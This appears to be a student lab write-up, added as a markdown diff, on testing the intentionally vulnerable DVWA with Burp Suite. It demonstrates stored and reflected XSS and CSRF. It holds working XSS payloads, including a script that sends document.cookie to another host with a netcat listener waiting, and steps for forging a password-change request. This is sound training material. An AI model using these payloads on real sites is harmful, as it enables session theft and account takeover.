@@ -1,0 +1,301 @@
+# Security Assessment of an Online Education Platform Using Burp Suite
+
+As a cybersecurity analyst, Burp Suite is used to identify and analyze vulnerabilities in a newly launched online education platform. The testing process involves configuring Burp Suite as an intercepting proxy, capturing HTTP requests and responses, and running automated scans to detect vulnerabilities such as Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF).
+
+---
+
+# Setting Up Burp Suite
+
+## 1. Start the Required Machines
+
+Ensure that the following virtual machines are running:
+
+* Kali Linux VM
+* Metasploitable2 VM
+
+The Metasploitable2 machine hosts the vulnerable web application DVWA (Damn Vulnerable Web Application).
+
+---
+
+## 2. Open DVWA in the Browser
+
+1. Open the browser in Kali Linux.
+2. Enter the IP address of Metasploitable2:
+
+[http://192.168.45.136](http://192.168.45.136)
+
+3. Click on DVWA.
+4. Login using the following credentials:
+
+Username: admin
+Password: password
+
+---
+
+## 3. Configure Burp Suite Proxy
+
+Burp Suite acts as an intercepting proxy between the browser and the web application.
+
+1. Launch Burp Suite.
+2. Navigate to:
+
+Proxy → Options
+
+3. Ensure the proxy listener is enabled on:
+
+127.0.0.1:8080
+
+4. Configure browser proxy settings:
+
+HTTP Proxy: 127.0.0.1
+Port: 8080
+
+5. Import Burp Suite’s CA certificate into the browser to avoid HTTPS certificate warnings.
+
+---
+
+## 4. Intercepting Traffic
+
+1. Go to:
+
+Proxy → Intercept
+
+2. Turn Intercept ON.
+3. Submit requests from the browser.
+4. Burp Suite captures the requests before forwarding them to the server.
+
+This allows the analyst to inspect and modify HTTP requests and responses.
+
+---
+
+# Automated Scanning with Burp Suite
+
+Burp Suite Professional provides automated vulnerability scanning.
+
+## Steps:
+
+1. Open the target application in Burp Browser.
+2. Right-click the target URL.
+3. Select:
+
+Scan
+
+4. Choose:
+
+* Crawl and Audit
+* Audit Selected Items
+
+Burp Suite automatically checks for:
+
+* XSS
+* CSRF
+* SQL Injection
+* Command Injection
+* Authentication flaws
+* Security misconfigurations
+
+---
+
+# a) Cross-Site Scripting (XSS)
+
+## Introduction
+
+Cross-Site Scripting (XSS) is a web vulnerability in which malicious scripts are injected into web pages and executed on the client side.
+
+Ensure Kali Linux and Metasploitable2 VM are running.
+
+Open the Metasploitable2 web application in the Kali Linux browser:
+
+[http://192.168.45.136](http://192.168.45.136)
+
+Click on DVWA and login using:
+
+Username: admin
+Password: password
+
+---
+
+# i) XSS Stored
+
+Stored XSS occurs when the injected script is permanently stored on the server. Whenever a user visits the affected page, the malicious script executes automatically.
+
+Navigate to:
+
+DVWA → XSS (Stored)
+
+Try the following inputs:
+
+Name: Test
+Message: <b>Hello Everyone</b>
+
+Click on Sign Guestbook.
+
+The text appears in bold because HTML tags are accepted.
+
+---
+
+Now enter:
+
+Name: Hi
+Message: <script>alert("Hello This is XSS")</script>
+
+Click on Sign Guestbook.
+
+A popup alert window appears.
+
+Now go to another page and return to the XSS Stored page. The popup appears again because the script is stored permanently.
+
+---
+
+## Fetching Cookies
+
+Enter the following script:
+
+<script>alert(document.cookie)</script>
+
+Navigate to XSS (Reflected) and paste the script. The browser displays the PHPSESSID cookie value.
+
+---
+
+## Stealing User Cookies
+
+Navigate to XSS Stored and increase the size of the message textbox.
+
+Enter the following script in the message field:
+
+<script>
+new Image().src="http://192.168.45.136/abc.php?output="+document.cookie;
+</script>
+
+Click on Sign Guestbook.
+
+Keep a listener ready in the Kali Linux terminal using:
+
+nc -lvnp 80
+
+Now visit other DVWA tabs and return to the XSS Stored page. The script steals the user’s cookie and sends it to the attacker machine.
+
+---
+
+# ii) XSS Reflected
+
+Reflected XSS occurs when the malicious script is immediately reflected from the server response and is not stored permanently.
+
+Navigate to:
+
+DVWA → XSS (Reflected)
+
+Enter the following:
+
+<script>alert("hello")</script>
+
+Click Submit.
+
+An alert popup window appears.
+
+Now go to another page and return to the XSS Reflected page. The popup no longer appears because the script was not stored on the server.
+
+---
+
+# b) Cross Site Request Forgery (CSRF)
+
+Ensure Kali Linux and Metasploitable2 VMs are running.
+
+## Steps to Perform CSRF Testing
+
+1. Log in to DVWA using:
+
+Username: admin
+Password: password
+
+2. Navigate to DVWA Security.
+3. Set the security level to:
+
+Low
+
+4. Click Submit.
+
+---
+
+## Configure Burp Suite
+
+1. Launch Burp Suite.
+2. Ensure proxy settings are configured properly.
+3. Import the Burp proxy certificate into the browser.
+
+---
+
+## Capture the Password Change Request
+
+1. Navigate to:
+
+DVWA → CSRF
+
+2. Enter a new password and confirm it.
+3. Turn Intercept ON in Burp Suite.
+4. Click on Change.
+
+Burp Suite captures the HTTP request.
+
+---
+
+## Send Request to Repeater
+
+1. Right-click the intercepted request.
+2. Select:
+
+Send to Repeater
+
+3. Forward the intercepted request.
+
+Return to DVWA and observe the message:
+
+Password Changed
+
+---
+
+## Modify the Request
+
+In the Repeater tab:
+
+1. Change the password parameter to another value.
+2. Click Send.
+
+Observe the response in the Render tab of Burp Suite. The application again displays:
+
+Password Changed
+
+This demonstrates that the request can be forged without proper validation.
+
+---
+
+## Final Verification
+
+1. Disable proxy intercept and browser proxy settings.
+2. Logout from DVWA.
+3. Attempt to login again using the old password.
+
+The login fails because the password has already been changed without the user’s knowledge.
+
+---
+
+# Conclusion
+
+Burp Suite is an essential tool for web application security testing. By configuring Burp Suite as an intercepting proxy and performing both manual and automated testing, vulnerabilities such as XSS and CSRF can be effectively identified.
+
+The assessment demonstrated:
+
+* Stored XSS
+* Reflected XSS
+* Cookie theft using malicious scripts
+* CSRF-based password manipulation
+* HTTP request interception and modification
+
+To secure the online education platform, the following protections should be implemented:
+
+* Input validation
+* Output encoding
+* CSRF tokens
+* Secure cookie settings
+* Content Security Policy (CSP)
+* Proper session management
